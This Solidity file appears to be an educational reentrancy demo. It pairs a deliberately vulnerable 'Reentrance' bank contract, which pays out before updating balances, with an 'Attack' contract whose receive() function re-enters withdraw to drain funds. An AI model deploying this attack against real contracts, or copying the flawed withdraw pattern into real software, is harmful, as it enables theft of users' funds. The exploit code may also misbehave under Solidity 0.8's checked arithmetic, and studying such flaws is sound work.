// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  event Log(address sender, address to, uint value, uint balance);
  event Hack(address sender, uint value, bool sent);

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
    emit Log(msg.sender, _to, msg.value, balances[_to]);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    
    emit Log(msg.sender ,address(this),balances[msg.sender],_amount);
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      emit Hack(msg.sender, _amount, result);
      if(result) {
        _amount;
      }
      
      balances[msg.sender] -= _amount;
    }
  }

  function getBalance() external view returns (uint){
    return address(this).balance;
  }  
  receive() external payable {}
}



contract Attack {
    event Log(uint balance, uint mybalance, address sender, uint value);
    Reentrance public reentrance;
    uint private amountToHack = 1000000000000000;
    
    

    constructor(address _addrReentrance)  {
        reentrance = Reentrance(payable(_addrReentrance));
    }

    receive() external payable{
      uint valorReceive = address(reentrance).balance;
      if( valorReceive >= amountToHack){
        reentrance.withdraw(amountToHack);
      }
    }
    
    function attack() public payable {
      uint valor = msg.value;
      require(valor >= amountToHack);
      reentrance.donate{value: msg.value}(address(this));
      reentrance.withdraw(msg.value);
       
    }

    function getBalance() public view returns (uint){
      return address(this).balance;
    }
    function getBankDeposits() public view returns (uint){
      return reentrance.balanceOf(address(this));
    }

    function meuDeposito() public view returns (uint){
      return reentrance.balanceOf(msg.sender);
    }

    function getBankBalance() public view returns (uint){
      return  address(reentrance).balance;
    }


}





